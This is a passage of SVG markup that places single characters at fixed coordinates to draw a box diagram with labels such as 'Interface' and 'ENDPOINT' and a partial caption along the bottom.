<text text-anchor='middle' x='360' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='708' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='724' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='740' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='804' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='820' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='836' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='360' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='964' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='368' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='964' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='384' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='964' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='392' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='180' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='392' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='436' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='392' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='580' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='392' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='708' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='724' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='740' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='804' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='820' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='836' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='392' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='964' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='400' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='964' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='416' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='964' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='424' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='964' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='432' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='212' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='432' y='244' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='432' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='432' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='432' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='432' y='308' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='432' y='340' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='432' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='432' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='432' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='432' y='404' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='432' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='612' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='432' y='644' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='432' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='432' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='432' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='432' y='708' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='432' y='740' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='432' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='432' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='432' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='432' y='804' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='432' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='964' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='440' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='212' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='440' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='612' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='440' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='964' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='448' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='212' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='448' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='612' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='448' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='964' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='456' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='212' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='456' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='612' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='456' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='964' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='464' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='212' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='464' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='276' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='464' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='372' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='464' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='612' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='464' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='676' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='464' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='772' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='464' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='964' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='472' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='212' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='472' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='276' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='472' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='372' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='472' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='612' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='472' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='676' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='472' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='772' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='472' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='964' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='480' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='212' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='480' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='276' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='480' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='372' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='480' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='612' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='480' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='676' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='480' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='772' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='480' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='964' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='488' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='212' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='488' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='276' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='488' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='372' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='488' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='612' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='488' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='676' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='488' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='772' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='488' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='964' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='496' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='212' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='496' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='276' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='496' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='372' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='496' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='612' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='496' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='676' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='496' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='772' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='496' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='964' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='504' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='276' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='504' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='372' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='504' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='676' fill='currentColor' style='font-size:1em'>I</text>
